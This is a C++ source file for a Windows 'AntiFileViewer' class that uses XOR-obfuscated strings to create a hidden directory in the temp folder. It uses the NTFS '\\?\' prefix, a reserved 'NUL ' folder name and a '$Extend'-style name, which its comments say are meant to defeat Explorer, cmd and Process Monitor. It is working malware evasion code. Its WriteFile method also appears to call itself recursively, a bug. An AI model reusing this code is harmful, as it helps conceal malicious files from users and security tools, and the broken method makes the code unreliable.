#include "stdafx.h"
#include "AntiFileViewer.h"
#include "StringEncrypt.h"
#include "Debug.h"
#include <sstream>

AntiFileViewer::AntiFileViewer()
{

}

AntiFileViewer::~AntiFileViewer()
{
}

bool AntiFileViewer::WriteFile(const std::wstring fileName, void* contents, DWORD size)
{
	std::wstring fullpath = AddFile(fileName);
	if (fullpath == L"")
		return false;
	if (WriteFile(fullpath, contents, size) != ERROR_SUCCESS)
		return false;
	return true;
}

//Queries exe path and returns if its inside AntiFileViewer location or not
bool AntiFileViewer::IsExecutingFromDir()
{
	wchar_t filePath[MAX_PATH];
	if (!GetModuleFileName(GetModuleHandle(NULL), filePath, MAX_PATH))
	{
#ifdef DEBUG
		std::wostringstream os;
		os << GetLastError();
		DebugOut(std::wstring(L"Failed GettingModuleFileName - ") + os.str());
		system("pause");
#endif // DEBUG
		exit(-1);
	}

	if (std::wstring(filePath).find(this->dir) == std::wstring::npos)
		return false;

	return true;
}

std::wstring AntiFileViewer::AddFile(const std::wstring fileName)
{
	HANDLE fileH;
	std::wstring fullPath = this->dir + L"\\" + fileName;
	if ((fileH = CreateFile(fullPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL)) == INVALID_HANDLE_VALUE) {
#ifdef DEBUG
		DebugOut(std::wstring(L"Failed creating file - ") + this->dir);
#endif // DEBUG
		return L"";
	}
	CloseHandle(fileH);
	return fullPath;
}
bool AntiFileViewer::Create()
{
	wchar_t tmpPath[MAX_PATH];
	bool res;
	GetTempPath(MAX_PATH, tmpPath);
	XorS(NTFS_PREFIX, "\\\\?\\");
	XorS(NUL, "\\NUL ");
	XorS(ANTI_PROC_DIR, "Low$Extended");

	//anti procmon path - .*($Extend).*
	std::wstring antiProcPath = tmpPath + ANTI_PROC_DIR.decrypt();
    res = CreateDirectoryW(antiProcPath.c_str(), NULL);
	if (!res && (GetLastError() != ERROR_ALREADY_EXISTS))
	{
#ifdef DEBUG
		DebugOut(std::wstring(L"Failed creating direcory - ") + antiProcPath);
#endif // DEBUG
		return false;
	}

	//Anti explorer/cmd folder - "NUL "
	this->dir = NTFS_PREFIX.decrypt() + antiProcPath + NUL.decrypt();
	res = CreateDirectory(this->dir.c_str(), NULL);
	if (!res && (GetLastError() != ERROR_ALREADY_EXISTS)) {
#ifdef DEBUG
		DebugOut(std::wstring(L"Failed creating direcory - ") + this->dir);
#endif // DEBUG
		return false;
	}

	return true;
}

